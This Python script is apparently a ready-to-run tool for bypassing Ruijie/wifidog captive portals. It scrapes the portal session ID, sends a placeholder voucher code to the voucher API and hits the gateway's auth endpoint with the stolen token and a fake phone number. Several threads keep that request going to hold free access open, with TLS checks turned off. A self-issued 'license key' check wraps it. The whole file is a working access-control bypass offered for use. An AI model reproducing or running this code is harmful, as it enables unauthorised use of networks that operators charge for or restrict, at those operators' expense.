import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import hashlib
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
RESET = "\033[0m"

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# GENERATE NEW KEY
# ===============================
def generate_new_key():
    """Generate a new random key"""
    timestamp = str(int(time.time()))
    random_part = hashlib.md5(os.urandom(16)).hexdigest()[:10].upper()
    key_code = f"RUIJIE-{random_part}-{timestamp[-6:]}"
    return key_code

# ===============================
# SHOW NEW KEY AND SAVE TO Key.tex
# ===============================
def show_and_save_key():
    """Display new key and instructions"""
    new_key = generate_new_key()
    
    print(f"\n{BLUE}{'='*50}{RESET}")
    print(f"{MAGENTA}🔑 YOUR NEW LICENSE KEY:{RESET}")
    print(f"{CYAN}{new_key}{RESET}")
    print(f"{BLUE}{'='*50}{RESET}")
    
    print(f"\n{YELLOW}📝 INSTRUCTIONS:{RESET}")
    print(f"1. Copy this key: {CYAN}{new_key}{RESET}")
    print(f"2. Edit {MAGENTA}Key.tex{RESET} file and paste the key")
    print(f"3. Add expiry date: {CYAN}{new_key}|12-31-2026{RESET} (or |LIFETIME)")
    print(f"4. Save and run {GREEN}python run.py{RESET} again")
    
    # Ask if want to save automatically
    print(f"\n{YELLOW}[?] Save key to Key.tex automatically? (y/n){RESET}")
    choice = input().lower()
    
    if choice == 'y':
        with open("Key.tex", "w") as f:
            f.write(f"{new_key}|LIFETIME")
        print(f"{GREEN}[✓] Key saved to Key.tex (LIFETIME){RESET}")
        print(f"{GREEN}[✓] Now run: python run.py{RESET}")
    else:
        print(f"{YELLOW}[!] Please manually add key to Key.tex{RESET}")
    
    return new_key

# ===============================
# VALIDATE KEY FROM Key.tex
# ===============================
def validate_key():
    """Validate key from Key.tex file"""
    try:
        with open("Key.tex", "r", encoding='utf-8') as f:
            content = f.read().strip()
        
        if not content:
            print(f"{RED}[X]{RESET} Key.tex is empty!")
            return False
        
        # Parse key and expiry
        if '|' in content:
            key_part, expiry_part = content.split('|', 1)
        else:
            key_part = content
            expiry_part = None
        
        print(f"{GREEN}[✓]{RESET} Found Key: {key_part}")
        
        # Check expiry
        if expiry_part and expiry_part.upper() != "LIFETIME":
            try:
                expiry_date = datetime.strptime(expiry_part, "%m-%d-%Y")
                if expiry_date < datetime.now():
                    print(f"{RED}[X]{RESET} License EXPIRED on {expiry_part}")
                    print(f"{YELLOW}[!]{RESET} Generate new key by deleting Key.tex and run again")
                    return False
                else:
                    days_left = (expiry_date - datetime.now()).days
                    print(f"{GREEN}[✓]{RESET} Valid until: {expiry_part} ({days_left} days left)")
            except:
                print(f"{RED}[X]{RESET} Invalid date format! Use: MM-DD-YYYY")
                return False
        else:
            print(f"{GREEN}[✓]{RESET} License Type: LIFETIME (Never expires)")
        
        print(f"{GREEN}[✓]{RESET} License VALID ✅")
        return True
        
    except FileNotFoundError:
        print(f"{RED}[X]{RESET} Key.tex not found!")
        print(f"{YELLOW}[!]{RESET} Generating new license key...")
        show_and_save_key()
        return False
    except Exception as e:
        print(f"{RED}[X]{RESET} Error: {e}")
        return False

# ===============================
# INTERNET CHECK
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# BANNER
# ===============================
def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Pro Terminal Edition         ║
╚══════════════════════════════════════╝
{RESET}""")

# ===============================
# HIGH SPEED PING THREAD
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def main():
    banner()
    
    # Validate license first
    if not validate_key():
        print(f"{RED}[!]{RESET} License validation failed!")
        return
    
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
            voucher_api = f"{portal_host}/api/auth/voucher/"

            try:
                v_res = session.post(
                    voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5
                )
                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
            except:
                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                ).start()

            while check_real_internet():
                time.sleep(5)

        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)
